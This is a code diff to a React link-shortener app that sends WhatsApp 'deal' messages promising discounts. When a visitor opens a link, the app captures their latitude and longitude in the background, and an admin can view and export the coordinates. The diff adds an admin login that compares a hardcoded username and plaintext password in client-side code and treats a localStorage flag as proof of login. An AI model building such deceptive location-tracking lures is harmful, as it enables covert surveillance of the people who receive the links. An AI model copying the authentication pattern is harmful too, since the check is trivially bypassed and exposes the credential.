@@ -20,7 +20,11 @@ import {
   ArrowRight,
   MessageCircle,
   Share2,
-  Shuffle
+  Shuffle,
+  Lock,
+  User,
+  LogOut,
+  ShieldCheck
 } from 'lucide-react';
 
 const DEAL_TEMPLATES = [
@@ -72,6 +76,14 @@ const ITEM_CATEGORIES = [
 ];
 
 export default function App() {
+  // Authentication State
+  const [isAuthenticated, setIsAuthenticated] = useState(() => {
+    return localStorage.getItem('admin_auth') === 'true';
+  });
+  const [loginUser, setLoginUser] = useState('');
+  const [loginPass, setLoginPass] = useState('');
+  const [loginError, setLoginError] = useState('');
+
   const [links, setLinks] = useState([]);
   const [events, setEvents] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -100,6 +112,29 @@ export default function App() {
 
   // Automatically detect domain
   const domainUrl = window.location.origin;
+
+  // Handle Login Authentication
+  const handleLogin = (e) => {
+    e.preventDefault();
+    setLoginError('');
+
+    const cleanUser = loginUser.trim();
+    if (cleanUser.toLowerCase() === 'pooja' && loginPass === 'Manoj@2002') {
+      setIsAuthenticated(true);
+      localStorage.setItem('admin_auth', 'true');
+      fetchAdminData();
+    } else {
+      setLoginError('Invalid Username or Password. Please try again.');
+    }
+  };
+
+  // Handle Logout
+  const handleLogout = () => {
+    setIsAuthenticated(false);
+    localStorage.removeItem('admin_auth');
+    setLoginUser('');
+    setLoginPass('');
+  };
 
   // Detect Device and Browser
   const getDeviceInfo = () => {
@@ -135,16 +170,17 @@ export default function App() {
       setVisitorMode(true);
       handleVisitorFlow(targetSlug);
     } else {
-      fetchAdminData();
-      const interval = setInterval(fetchAdminDataSilently, 5000);
-      return () => clearInterval(interval);
+      if (isAuthenticated) {
+        fetchAdminData();
+        const interval = setInterval(fetchAdminDataSilently, 5000);
+        return () => clearInterval(interval);
+      }
     }
-  }, []);
+  }, [isAuthenticated]);
 
   // Visitor Tracking & Redirection Engine with Offer Applied
   const handleVisitorFlow = async (slug) => {
     try {
-      // 1. Resolve destination & offer from Supabase
       const { data: link, error } = await supabase
         .from('short_links')
         .select('*')
@@ -163,7 +199,6 @@ export default function App() {
       setVisitorOffer(cleanDiscount);
       setVisitorPlatform(link.platform === 'amazon' ? 'Amazon' : link.platform === 'flipkart' ? 'Flipkart' : 'Store');
 
-      // 2. Append ?iotkitoffer=800off to destination URL
       let finalTargetUrl = link.destination_url;
       try {
         const urlObj = new URL(link.destination_url);
@@ -176,10 +211,8 @@ export default function App() {
 
       setVisitorDestination(finalTargetUrl);
 
-      // 3. Silently capture Latitude & Longitude in background
       captureLocationInBackground(link, slug);
 
-      // 4. Start 2-second countdown and redirect
       setOfferStatus(`Offer Grabbed! Book something to get ₹${cleanDiscount} OFF on ${link.platform === 'flipkart' ? 'Flipkart' : 'Amazon'}. Redirecting...`);
 
       let timeLeft = 2;
@@ -609,7 +642,115 @@ export default function App() {
   }
 
   // ==========================================
-  // RENDER: Admin Dashboard
+  // RENDER: ADMIN LOGIN SCREEN (When not authenticated)
+  // ==========================================
+  if (!isAuthenticated) {
+    return (
+      <div style={{
+        minHeight: '100vh',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        padding: '1.5rem',
+        background: 'radial-gradient(circle at 50% 20%, #1e293b 0%, #0b0f19 80%)'
+      }}>
+        <div className="card" style={{
+          maxWidth: '400px',
+          width: '100%',
+          border: '1px solid #1e3a8a',
+          boxShadow: '0 25px 60px rgba(0,0,0,0.7)',
+          background: '#0f172a'
+        }}>
+          <div style={{ textAlign: 'center', marginBottom: '1.75rem' }}>
+            <div style={{
+              display: 'inline-flex',
+              padding: '0.9rem',
+              background: '#1e3a8a',
+              borderRadius: '50%',
+              marginBottom: '1rem'
+            }}>
+              <Lock size={32} color="#60a5fa" />
+            </div>
+            <h1 style={{ fontSize: '1.5rem', fontWeight: 700, color: '#f8fafc' }}>
+              Admin Dashboard Login
+            </h1>
+            <p style={{ color: '#94a3b8', fontSize: '0.85rem', marginTop: '0.25rem' }}>
+              Enter administrator credentials to manage links and view coordinates.
+            </p>
+          </div>
+
+          {loginError && (
+            <div style={{
+              background: '#7f1d1d44',
+              border: '1px solid #ef4444',
+              color: '#fca5a5',
+              padding: '0.75rem',
+              borderRadius: '8px',
+              marginBottom: '1.25rem',
+              display: 'flex',
+              alignItems: 'center',
+              gap: '0.5rem',
+              fontSize: '0.85rem'
+            }}>
+              <AlertCircle size={16} /> {loginError}
+            </div>
+          )}
+
+          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+            <div>
+              <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>
+                Username
+              </label>
+              <div style={{ position: 'relative' }}>
+                <input
+                  type="text"
+                  placeholder="Enter username"
+                  value={loginUser}
+                  onChange={(e) => setLoginUser(e.target.value)}
+                  required
+                  style={{ paddingLeft: '2.5rem' }}
+                />
+                <User size={16} color="#64748b" style={{ position: 'absolute', left: '0.85rem', top: '50%', transform: 'translateY(-50%)' }} />
+              </div>
+            </div>
+
+            <div>
+              <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>
+                Password
+              </label>
+              <div style={{ position: 'relative' }}>
+                <input
+                  type="password"
+                  placeholder="Enter password"
+                  value={loginPass}
+                  onChange={(e) => setLoginPass(e.target.value)}
+                  required
+                  style={{ paddingLeft: '2.5rem' }}
+                />
+                <Lock size={16} color="#64748b" style={{ position: 'absolute', left: '0.85rem', top: '50%', transform: 'translateY(-50%)' }} />
+              </div>
+            </div>
+
+            <button
+              type="submit"
+              className="btn-primary"
+              style={{
+                marginTop: '0.5rem',
+                justifyContent: 'center',
+                padding: '0.75rem',
+                fontSize: '1rem'
+              }}
+            >
+              Sign In to Dashboard
+            </button>
+          </form>
+        </div>
+      </div>
+    );
+  }
+
+  // ==========================================
+  // RENDER: Admin Dashboard (When Authenticated)
   // ==========================================
   const gpsCount = events.filter(e => e.gps_consent).length;
   const ipCount = events.filter(e => !e.gps_consent).length;
@@ -623,19 +764,52 @@ export default function App() {
             <div style={{ background: '#2563eb', padding: '0.5rem', borderRadius: '10px' }}>
               <LinkIcon size={24} color="#ffffff" />
             </div>
-            <h1 style={{ fontSize: '1.75rem', fontWeight: 700 }}>Smart Link Generator & WhatsApp Deal Sharer</h1>
+            <h1 style={{ fontSize: '1.75rem', fontWeight: 700 }}>Smart Link Generator & Visitor Intelligence</h1>
           </div>
           <p style={{ color: '#94a3b8', marginTop: '0.25rem' }}>
-            Generate short links with instant WhatsApp deal messages (Powerbank, Electronics & ₹800 OFF) and track visitor coordinates.
+            Generate short links with WhatsApp deal messages (Powerbank, Electronics & ₹800 OFF) and track visitor coordinates.
           </p>
         </div>
 
-        <div style={{ display: 'flex', gap: '0.75rem' }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
+          <div style={{
+            display: 'flex',
+            alignItems: 'center',
+            gap: '0.4rem',
+            background: '#1e293b',
+            padding: '0.4rem 0.8rem',
+            borderRadius: '8px',
+            fontSize: '0.85rem',
+            color: '#94a3b8'
+          }}>
+            <ShieldCheck size={16} color="#10b981" />
+            <span>Admin: <strong style={{ color: '#f8fafc' }}>Pooja</strong></span>
+          </div>
+
           <button onClick={fetchAdminData} className="btn-secondary" title="Refresh Data">
             <RefreshCw size={16} /> Refresh
           </button>
           <button onClick={handleExportJSON} className="btn-secondary" title="Export Captured Lat & Long as JSON">
             <Download size={16} /> Export JSON
+          </button>
+          <button
+            onClick={handleLogout}
+            style={{
+              background: '#ef444422',
+              color: '#f87171',
+              border: '1px solid #ef444455',
+              padding: '0.5rem 0.9rem',
+              borderRadius: '8px',
+              fontSize: '0.85rem',
+              fontWeight: 600,
+              cursor: 'pointer',
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: '0.35rem'
+            }}
+            title="Log out of admin session"
+          >
+            <LogOut size={15} /> Logout
           </button>
         </div>
       </header>
@@ -1095,7 +1269,7 @@ export default function App() {
                       <span style={{
                         padding: '0.2rem 0.5rem',
                         borderRadius: '4px',
-                        fontSize: '0.75rem',
+                        fontSize: '0.7rem',
                         fontWeight: 600,
                         background: ev.gps_consent ? '#065f46' : '#1e3a8a',
                         color: ev.gps_consent ? '#34d399' : '#93c5fd'
